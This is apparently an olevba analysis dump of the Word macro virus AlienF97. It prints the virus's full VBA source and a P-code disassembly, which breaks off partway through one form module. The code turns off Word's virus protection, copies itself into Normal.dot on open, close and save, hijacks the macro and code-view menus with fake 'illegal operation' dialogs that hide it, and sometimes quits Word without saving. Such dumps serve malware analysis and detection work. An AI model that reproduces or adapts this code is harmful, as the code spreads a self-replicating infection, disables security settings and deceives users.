olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Af.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Af.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AlienF97.bas 
in file: Virus.MSWord.Af.a - OLE stream: 'Macros/VBA/AlienF97'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAC
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "AlienF97" Then
        AlienInstalled = -1
    End If
Next i
If Not AlienInstalled Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="AlienF97", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
End If
ErrorAC:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAO
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "AlienF97" Then
        AlienInstalled = -1
    End If
Next i
If Not AlienInstalled Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="AlienF97", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
End If
Dim MyDate, MyWeek, Longueur
Nom$ = ActiveDocument.Name
Longueur = Len(Nom$)
Randomize
a$ = Int(Rnd * 12) + 1
MyDate = Date
D$ = Mid(MyDate, 1, 5)
MyWeek = WeekDay(MyDate, vbMonday)
If D$ = "01/08" Then
Select Case a$
    Case 1 To 6
        MsgBox "Quelques Années de Survie...", Title:="AlienF97"
        Application.Quit SaveChanges:=wdDoNotSaveChanges
End Select
End If
If MyWeek = "7" Then
Select Case a$
    Case 7 To 12
        MsgBox "C'est Dimanche & J'ai l'intention de me relaxer", Title:="AlienF97"
        Application.Quit SaveChanges:=wdDoNotSaveChanges
End Select
End If

If Longueur < 9 Then
    MsgBox "Longueur De Noms De Fichier Déjà Utilisé", Title:="Tip de la part d'AlienF97"
End If

If (a$ = "1") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "N'ouvrez Jamais d'Autres Fichiers !", Title:="AlienF97"
End If
If (a$ = "2") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "Ne Faîtes Pas Confiance à Un Alien !", Title:="AlienF97"
End If
If (a$ = "3") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "Ne Croyez Pas Tous Les Tips!", Title:="AlienF97"
End If
If (a$ = "4") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "Sauvegarder Souvent Vos Données.", Title:="AlienF97"
End If
If (a$ = "5") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "Trois Acclamations pour AlienF97." & Chr$(13) & "Hip Hip Hourra !", Title:="AlienF97"
End If
If (a$ = "6") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "Je Reviendrai !", Title:="AlienF97"
End If
If (a$ = "7") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "Salut Beauté !", Title:="AlienF97"
End If
If (a$ = "8") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "Tu Me Facines.", Title:="AlienF97"
End If
If (a$ = "9") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "Ne Regarde Pas Trop Loin !", Title:="AlienF97"
End If
If (a$ = "10") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "Le Virus 'AlienF97' Est Arrivé !", Title:="AlienF97"
End If
If (a$ = "11") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "AlienF97 Est En Vie...", Title:="AlienF97"
End If
ErrorAO:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
        If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
            ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
        End If
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=NormalTemplate.FullName, Name:="AlienF97", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
    ActiveDocument.Save
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFT
    UserForm900.Show
ErrorFT:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorTM
    UserForm999.Show
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm900.frm 
in file: Virus.MSWord.Af.a - OLE stream: 'Macros/VBA/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




Private Sub CommandButton1_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton2_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton3_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton4_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton5_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton6_Click()
Unload UserForm900
End Sub

Private Sub UserForm_Initialize()
    TextBox1.Text = NormalTemplate.Name
    CommandButton2.Enabled = False
    CommandButton3.Enabled = False
    CommandButton4.Enabled = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm999.frm 
in file: Virus.MSWord.Af.a - OLE stream: 'Macros/VBA/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 








Private Sub ListBox1_Click()
    If ListBox1.Selected(0) = True Then
        CommandButton1.Enabled = True
        CommandButton3.Enabled = True
        CommandButton4.Enabled = True
        CommandButton6.Enabled = True
    ElseIf ListBox1.Selected(1) = True Then
        CommandButton1.Enabled = True
        CommandButton3.Enabled = True
        CommandButton4.Enabled = True
        CommandButton6.Enabled = True
    Else
        CommandButton1.Enabled = False
        CommandButton3.Enabled = False
        CommandButton4.Enabled = False
        CommandButton6.Enabled = False
    End If
End Sub

Private Sub UserForm_Initialize()
    ComboBox1.AddItem "Commande Word"
    ComboBox1.AddItem "Tous les modèles actifs"
    ComboBox1.AddItem "Normal.dot (modèle global)"
    ComboBox1.AddItem WordBasic.WindowName$()
    CommandButton1.Enabled = False
    CommandButton3.Enabled = False
    TextBox2.Text = "Macro créée le " & Date & " par " & Application.UserName
End Sub

Private Sub CommandButton1_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub
Private Sub CommandButton2_Click()
Unload UserForm999
End Sub

Private Sub CommandButton3_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

Private Sub CommandButton4_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

Private Sub CommandButton5_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

Private Sub CommandButton6_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

Private Sub CommandButton7_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub
Private Sub ScrollBar1_Change()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Af.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1190 bytes
' Macros/VBA/AlienF97 - 12313 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	OnError ErrorAC 
' Line #5:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #6:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #7:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0008 "AlienF97"
' 	Eq 
' 	IfBlock 
' Line #8:
' 	LitDI2 0x0001 
' 	UMi 
' 	St AlienInstalled 
' Line #9:
' 	EndIfBlock 
' Line #10:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #11:
' 	Ld AlienInstalled 
' 	Not 
' 	IfBlock 
' Line #12:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "AlienF97"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #13:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "UserForm900"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #14:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "UserForm999"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Label ErrorAC 
' Line #17:
' 	EndSub 
' Line #18:
' 	FuncDefn (Sub AutoOpen())
' Line #19:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #20:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #21:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #22:
' 	OnError ErrorAO 
' Line #23:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #24:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #25:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0008 "AlienF97"
' 	Eq 
' 	IfBlock 
' Line #26:
' 	LitDI2 0x0001 
' 	UMi 
' 	St AlienInstalled 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	Ld AlienInstalled 
' 	Not 
' 	IfBlock 
' Line #30:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "AlienF97"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #31:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "UserForm900"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #32:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "UserForm999"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	Dim 
' 	VarDefn MyDate
' 	VarDefn MyWeek
' 	VarDefn Longueur
' Line #35:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	St Nom$ 
' Line #36:
' 	Ld Nom$ 
' 	FnLen 
' 	St Longueur 
' Line #37:
' 	ArgsCall Read 0x0000 
' Line #38:
' 	Ld Rnd 
' 	LitDI2 0x000C 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St a$ 
' Line #39:
' 	Ld Date 
' 	St MyDate 
' Line #40:
' 	Ld MyDate 
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	ArgsLd Mid$ 0x0003 
' 	St D$ 
' Line #41:
' 	Ld MyDate 
' 	Ld vbMonday 
' 	ArgsLd WeekDay 0x0002 
' 	St MyWeek 
' Line #42:
' 	Ld D$ 
' 	LitStr 0x0005 "01/08"
' 	Eq 
' 	IfBlock 
' Line #43:
' 	Ld a$ 
' 	SelectCase 
' Line #44:
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	CaseTo 
' 	CaseDone 
' Line #45:
' 	LitStr 0x001C "Quelques Années de Survie..."
' 	LitStr 0x0008 "AlienF97"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #46:
' 	Ld wdDoNotSaveChanges 
' 	ParamNamed SaveChanges 
' 	Ld Application 
' 	ArgsMemCall Quit 0x0001 
' Line #47:
' 	EndSelect 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Ld MyWeek 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	IfBlock 
' Line #50:
' 	Ld a$ 
' 	SelectCase 
' Line #51:
' 	LitDI2 0x0007 
' 	LitDI2 0x000C 
' 	CaseTo 
' 	CaseDone 
' Line #52:
' 	LitStr 0x002F "C'est Dimanche & J'ai l'intention de me relaxer"
' 	LitStr 0x0008 "AlienF97"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #53:
' 	Ld wdDoNotSaveChanges 
' 	ParamNamed SaveChanges 
' 	Ld Application 
' 	ArgsMemCall Quit 0x0001 
' Line #54:
' 	EndSelect 
' Line #55:
' 	EndIfBlock 
' Line #56:
' Line #57:
' 	Ld Longueur 
' 	LitDI2 0x0009 
' 	Lt 
' 	IfBlock 
' Line #58:
' 	LitStr 0x0028 "Longueur De Noms De Fichier Déjà Utilisé"
' 	LitStr 0x0019 "Tip de la part d'AlienF97"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #59:
' 	EndIfBlock 
' Line #60:
' Line #61:
' 	Ld a$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	Paren 
' 	Ld MyWeek 
' 	LitStr 0x0001 "7"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld D$ 
' 	LitStr 0x0005 "01/08"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #62:
' 	LitStr 0x0023 "N'ouvrez Jamais d'Autres Fichiers !"
' 	LitStr 0x0008 "AlienF97"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	Ld a$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	Paren 
' 	Ld MyWeek 
' 	LitStr 0x0001 "7"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld D$ 
' 	LitStr 0x0005 "01/08"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #65:
' 	LitStr 0x0024 "Ne Faîtes Pas Confiance à Un Alien !"
' 	LitStr 0x0008 "AlienF97"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	Ld a$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	Paren 
' 	Ld MyWeek 
' 	LitStr 0x0001 "7"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld D$ 
' 	LitStr 0x0005 "01/08"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #68:
' 	LitStr 0x001C "Ne Croyez Pas Tous Les Tips!"
' 	LitStr 0x0008 "AlienF97"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	Ld a$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	Paren 
' 	Ld MyWeek 
' 	LitStr 0x0001 "7"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld D$ 
' 	LitStr 0x0005 "01/08"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #71:
' 	LitStr 0x0020 "Sauvegarder Souvent Vos Données."
' 	LitStr 0x0008 "AlienF97"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	Ld a$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	Paren 
' 	Ld MyWeek 
' 	LitStr 0x0001 "7"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld D$ 
' 	LitStr 0x0005 "01/08"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #74:
' 	LitStr 0x0021 "Trois Acclamations pour AlienF97."
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0010 "Hip Hip Hourra !"
' 	Concat 
' 	LitStr 0x0008 "AlienF97"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #75:
' 	EndIfBlock 
' Line #76:
' 	Ld a$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	Paren 
' 	Ld MyWeek 
' 	LitStr 0x0001 "7"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld D$ 
' 	LitStr 0x0005 "01/08"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #77:
' 	LitStr 0x000F "Je Reviendrai !"
' 	LitStr 0x0008 "AlienF97"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #78:
' 	EndIfBlock 
' Line #79:
' 	Ld a$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	Paren 
' 	Ld MyWeek 
' 	LitStr 0x0001 "7"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld D$ 
' 	LitStr 0x0005 "01/08"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #80:
' 	LitStr 0x000E "Salut Beauté !"
' 	LitStr 0x0008 "AlienF97"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #81:
' 	EndIfBlock 
' Line #82:
' 	Ld a$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	Paren 
' 	Ld MyWeek 
' 	LitStr 0x0001 "7"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld D$ 
' 	LitStr 0x0005 "01/08"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #83:
' 	LitStr 0x000E "Tu Me Facines."
' 	LitStr 0x0008 "AlienF97"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	Ld a$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	Paren 
' 	Ld MyWeek 
' 	LitStr 0x0001 "7"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld D$ 
' 	LitStr 0x0005 "01/08"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #86:
' 	LitStr 0x001A "Ne Regarde Pas Trop Loin !"
' 	LitStr 0x0008 "AlienF97"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #87:
' 	EndIfBlock 
' Line #88:
' 	Ld a$ 
' 	LitStr 0x0002 "10"
' 	Eq 
' 	Paren 
' 	Ld MyWeek 
' 	LitStr 0x0001 "7"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld D$ 
' 	LitStr 0x0005 "01/08"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #89:
' 	LitStr 0x0020 "Le Virus 'AlienF97' Est Arrivé !"
' 	LitStr 0x0008 "AlienF97"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #90:
' 	EndIfBlock 
' Line #91:
' 	Ld a$ 
' 	LitStr 0x0002 "11"
' 	Eq 
' 	Paren 
' 	Ld MyWeek 
' 	LitStr 0x0001 "7"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld D$ 
' 	LitStr 0x0005 "01/08"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #92:
' 	LitStr 0x0016 "AlienF97 Est En Vie..."
' 	LitStr 0x0008 "AlienF97"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #93:
' 	EndIfBlock 
' Line #94:
' 	Label ErrorAO 
' Line #95:
' 	EndSub 
' Line #96:
' 	FuncDefn (Sub FileSaveAs())
' Line #97:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #98:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #99:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #100:
' 	OnError ErrorFSA 
' Line #101:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #102:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #103:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #104:
' 	EndIfBlock 
' Line #105:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "AlienF97"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #106:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "UserForm900"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #107:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "UserForm999"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #108:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #109:
' 	Label ErrorFSA 
' Line #110:
' 	EndSub 
' Line #111:
' 	FuncDefn (Sub FileTemplates())
' Line #112:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #113:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #114:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #115:
' 	OnError ErrorFT 
' Line #116:
' 	Ld UserForm900 
' 	ArgsMemCall Show 0x0000 
' Line #117:
' 	Label ErrorFT 
' Line #118:
' 	EndSub 
' Line #119:
' 	FuncDefn (Sub ToolsMacro())
' Line #120:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #121:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #122:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #123:
' 	OnError ErrorTM 
' Line #124:
' 	Ld UserForm999 
' 	ArgsMemCall Show 0x0000 
' Line #125:
' 	Label ErrorTM 
' Line #126:
' 	EndSub 
' Line #127:
' 	FuncDefn (Sub ViewVBCode())
' Line #128:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #129:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #130:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #131:
' 	OnError ErrorVVBC 
' Line #132:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #133:
' 	Label ErrorVVBC 
' Line #134:
' 	EndSub 
' Macros/VBA/UserForm900 - 7105 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #5:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0003 
' Line #6:
' 	Ld UserForm900 
' 	ArgsCall Unlock 0x0001 
' Line #7:
' 	EndSub 
' Line #8:
' Line #9:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #10:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0003 
' Line #11:
' 	Ld UserForm900 
' 	ArgsCall Unlock 0x0001 
' Line #12:
' 	EndSub 
' Line #13:
' Line #14:
' 	FuncDefn (Private Sub CommandButton3_Click())
' Line #15:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0003 
' Line #16:
' 	Ld UserForm900 
' 	ArgsCall Unlock 0x0001 
' Line #17:
' 	EndSub 
' Line #18:
' Line #19:
' 	FuncDefn (Private Sub CommandButton4_Click())
' Line #20:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0003 
' Line #21:
' 	Ld UserForm900 
' 	ArgsCall Unlock 0x0001 
' Line #22:
